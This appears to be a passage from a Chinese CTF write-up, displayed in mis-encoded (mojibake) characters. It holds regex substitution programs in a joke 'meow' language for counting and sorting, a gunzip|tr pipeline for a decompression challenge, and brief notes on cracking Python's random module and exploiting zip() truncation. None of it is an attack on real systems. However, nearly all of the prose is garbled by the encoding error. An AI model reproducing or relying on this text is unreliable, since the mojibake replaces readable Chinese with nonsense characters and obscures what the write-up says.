æŠŠã€eaã€‘æ›¿æ¢æˆã€e000aã€‘å–µ
æŠŠã€e$ã€‘æ›¿æ¢æˆã€e0000ã€‘å–µ
æŠŠã€dbã€‘æ›¿æ¢æˆã€d0bã€‘å–µ
æŠŠã€daã€‘æ›¿æ¢æˆã€d00aã€‘å–µ
æŠŠã€d$ã€‘æ›¿æ¢æˆã€d000ã€‘å–µ
æŠŠã€caã€‘æ›¿æ¢æˆã€c0aã€‘å–µ
æŠŠã€c$ã€‘æ›¿æ¢æˆã€c00ã€‘å–µ
æŠŠã€b$ã€‘æ›¿æ¢æˆã€b0ã€‘å–µ

æŠŠã€eeeeeeeeeã€‘æ›¿æ¢æˆã€9ã€‘å–µ
æŠŠã€eeeeeeeeã€‘æ›¿æ¢æˆã€8ã€‘å–µ
æŠŠã€eeeeeeeã€‘æ›¿æ¢æˆã€7ã€‘å–µ
æŠŠã€eeeeeeã€‘æ›¿æ¢æˆã€6ã€‘å–µ
æŠŠã€eeeeeã€‘æ›¿æ¢æˆã€5ã€‘å–µ
æŠŠã€eeeeã€‘æ›¿æ¢æˆã€4ã€‘å–µ
æŠŠã€eeeã€‘æ›¿æ¢æˆã€3ã€‘å–µ
æŠŠã€eeã€‘æ›¿æ¢æˆã€2ã€‘å–µ
æŠŠã€eã€‘æ›¿æ¢æˆã€1ã€‘å–µ
æŠŠã€dddddddddã€‘æ›¿æ¢æˆã€9ã€‘å–µ
æŠŠã€ddddddddã€‘æ›¿æ¢æˆã€8ã€‘å–µ
æŠŠã€dddddddã€‘æ›¿æ¢æˆã€7ã€‘å–µ
æŠŠã€ddddddã€‘æ›¿æ¢æˆã€6ã€‘å–µ
æŠŠã€dddddã€‘æ›¿æ¢æˆã€5ã€‘å–µ
æŠŠã€ddddã€‘æ›¿æ¢æˆã€4ã€‘å–µ
æŠŠã€dddã€‘æ›¿æ¢æˆã€3ã€‘å–µ
æŠŠã€ddã€‘æ›¿æ¢æˆã€2ã€‘å–µ
æŠŠã€dã€‘æ›¿æ¢æˆã€1ã€‘å–µ
æŠŠã€cccccccccã€‘æ›¿æ¢æˆã€9ã€‘å–µ
æŠŠã€ccccccccã€‘æ›¿æ¢æˆã€8ã€‘å–µ
æŠŠã€cccccccã€‘æ›¿æ¢æˆã€7ã€‘å–µ
æŠŠã€ccccccã€‘æ›¿æ¢æˆã€6ã€‘å–µ
æŠŠã€cccccã€‘æ›¿æ¢æˆã€5ã€‘å–µ
æŠŠã€ccccã€‘æ›¿æ¢æˆã€4ã€‘å–µ
æŠŠã€cccã€‘æ›¿æ¢æˆã€3ã€‘å–µ
æŠŠã€ccã€‘æ›¿æ¢æˆã€2ã€‘å–µ
æŠŠã€cã€‘æ›¿æ¢æˆã€1ã€‘å–µ
æŠŠã€bbbbbbbbbã€‘æ›¿æ¢æˆã€9ã€‘å–µ
æŠŠã€bbbbbbbbã€‘æ›¿æ¢æˆã€8ã€‘å–µ
æŠŠã€bbbbbbbã€‘æ›¿æ¢æˆã€7ã€‘å–µ
æŠŠã€bbbbbbã€‘æ›¿æ¢æˆã€6ã€‘å–µ
æŠŠã€bbbbbã€‘æ›¿æ¢æˆã€5ã€‘å–µ
æŠŠã€bbbbã€‘æ›¿æ¢æˆã€4ã€‘å–µ
æŠŠã€bbbã€‘æ›¿æ¢æˆã€3ã€‘å–µ
æŠŠã€bbã€‘æ›¿æ¢æˆã€2ã€‘å–µ
æŠŠã€bã€‘æ›¿æ¢æˆã€1ã€‘å–µ
æŠŠã€aaaaaaaaaã€‘æ›¿æ¢æˆã€9ã€‘å–µ
æŠŠã€aaaaaaaaã€‘æ›¿æ¢æˆã€8ã€‘å–µ
æŠŠã€aaaaaaaã€‘æ›¿æ¢æˆã€7ã€‘å–µ
æŠŠã€aaaaaaã€‘æ›¿æ¢æˆã€6ã€‘å–µ
æŠŠã€aaaaaã€‘æ›¿æ¢æˆã€5ã€‘å–µ
æŠŠã€aaaaã€‘æ›¿æ¢æˆã€4ã€‘å–µ
æŠŠã€aaaã€‘æ›¿æ¢æˆã€3ã€‘å–µ
æŠŠã€aaã€‘æ›¿æ¢æˆã€2ã€‘å–µ
æŠŠã€aã€‘æ›¿æ¢æˆã€1ã€‘å–µ

å¦‚æœçœ‹åˆ°ã€[0-9]ã€‘å°±è·³è½¬åˆ°ã€ç»“æŸã€‘å–µ
æŠŠã€^ã€‘æ›¿æ¢æˆã€0ã€‘å–µ

ç»“æŸï¼š
è°¢è°¢å–µ
```

ç¬¬äºŒé—®æŒ‰ç…§æç¤ºçš„ç¡æ’åºçš„æ€è·¯ï¼Œä½†æ˜¯è¢« regex catastrophic backtracking å¡ä½äº†ï¼Œä¹‹åæ²¡ç»†ç©¶ã€‚

ä¸¤ç§å°è¯•ï¼š

```
é‡å¤æŠŠã€\n\nã€‘æ›¿æ¢æˆã€\nã€‘å–µ
æŠŠã€(.+)ã€‘æ›¿æ¢æˆã€\1ğŸ˜¸ã€‘å–µ

å¦‚æœæ²¡çœ‹åˆ°ã€ğŸ˜¸ã€‘å°±è·³è½¬åˆ°ã€ç»“æŸã€‘å–µ

æ’åºï¼š
æŠŠã€(?m)^(.)(.*)(ğŸ˜¸.*)ã€‘æ›¿æ¢æˆã€\2\3\1ã€‘å–µ
é‡å¤æŠŠã€(?sm)(^[^ğŸ˜¸][^\n]*)(\n.*)(^ğŸ˜¸[^\n]*)ã€‘æ›¿æ¢æˆã€\3\2\1ã€‘å–µ

å¦‚æœçœ‹åˆ°ã€(?m)^[^ğŸ˜¸]ã€‘å°±è·³è½¬åˆ°ã€æ’åºã€‘å–µ
æŠŠã€ğŸ˜¸ã€‘æ›¿æ¢æˆã€ã€‘å–µ

ç»“æŸï¼š
è°¢è°¢å–µ
```

å’Œ

```
é‡å¤æŠŠã€\n\nã€‘æ›¿æ¢æˆã€\nã€‘å–µ
æŠŠã€(.+)ã€‘æ›¿æ¢æˆã€\1âœ‹ã€‘å–µ

å¦‚æœæ²¡çœ‹åˆ°ã€âœ‹ã€‘å°±è·³è½¬åˆ°ã€ç»“æŸã€‘å–µ

æ’åºï¼š
æŠŠã€(?m)^(.)(.*)(âœ‹.*)ã€‘æ›¿æ¢æˆã€\2\3\1ã€‘å–µ
å¦‚æœæ²¡çœ‹åˆ°ã€(?m)^âœ‹ã€‘å°±è·³è½¬åˆ°ã€æ’åºã€‘å–µ
æŠŠã€(?m)^âœ‹ã€‘æ›¿æ¢æˆã€â“‚ã€‘å–µ
é‡å¤æŠŠã€(?sm)(^[^âœ‹âœ‚ï¸â“‚][^\n]*)(\n[^â“‚]*)(^â“‚[^\n]*)ã€‘æ›¿æ¢æˆã€\3\2\1ã€‘å–µ
æŠŠã€(?m)^â“‚ã€‘æ›¿æ¢æˆã€âœ‚ï¸ã€‘å–µ

å¦‚æœçœ‹åˆ°ã€âœ‹ã€‘å°±è·³è½¬åˆ°ã€æ’åºã€‘å–µ
æŠŠã€âœ‚ï¸ã€‘æ›¿æ¢æˆã€ã€‘å–µ

ç»“æŸï¼š
è°¢è°¢å–µ
```

## æœªæ¥ç£ç›˜ï¼ˆéƒ¨åˆ†ï¼‰

ç¬¬ä¸€é—®ç›´æ¥è§£å‹å‡ æ¬¡ç›´åˆ°å‘ç°è¾“å‡ºä¸€ç›´æ˜¯ 0ï¼Œç”šè‡³å¦‚æœä½ åœ¨ç”¨ btrfs/zfsï¼Œå¹¶ä¸”å¼€å¯äº†é€æ˜å‹ç¼©ï¼Œå³ä½¿ç›˜æ²¡åˆ° 7T ä¹Ÿå¯ä»¥ç›´æ¥è§£å‹ã€‚

å½“ç„¶æœ€åæˆ‘è¿˜æ˜¯æ¢äº†å°æœºå™¨ç”¨ç®¡é“è·‘ï¼Œæ¯•ç«Ÿæœ‰ç‚¹æ…¢ï¼š

```shell
gunzip -c flag1.gz | tr -d '\0' > tr.txt
```

## å°ç« é±¼çš„æ›²å¥‡ï¼ˆéƒ¨åˆ†ï¼‰

ç¬¬ä¸€é—® <https://github.com/tna0y/Python-random-module-cracker>ï¼Œç¬¬ä¸‰é—®çœ‹æç¤ºï¼Œç„¶åçœ‹ä»£ç å‘ç° `zip()` åªå–æ¯”è¾ƒçŸ­çš„é‚£ä¸ª list ä½œä¸ºé•¿åº¦ï¼Œå› æ­¤åªè¦è¾“å…¥ä¸€ä¸ªå€¼å°±å¤Ÿäº†ã€‚
